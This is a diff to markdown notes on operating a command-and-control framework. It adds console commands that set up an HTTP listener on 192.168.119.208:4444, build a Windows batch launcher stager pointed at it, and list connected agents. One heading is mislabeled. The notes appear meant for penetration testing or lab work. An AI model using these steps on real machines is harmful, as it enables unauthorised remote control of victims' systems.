@@ -44,6 +44,38 @@ After starting both the client an server, the methodology used to carry out an a
 4. Interact with the agents
 5. Run Post Exploitation commands
 
+### Setting up a listener:
 
+```
+use Listener http
+
+set Name test
+
+set Host 192.168.119.208
+
+set Port 4444
+
+execute
+
+```
+
+### Setting up a stager:
+
+
+```
+usestager windows/launcher_bat
+
+set Listener test
+
+execute
+
+```
+
+
+### Setting up a stager:
+
+```
+agents
+```
 
 
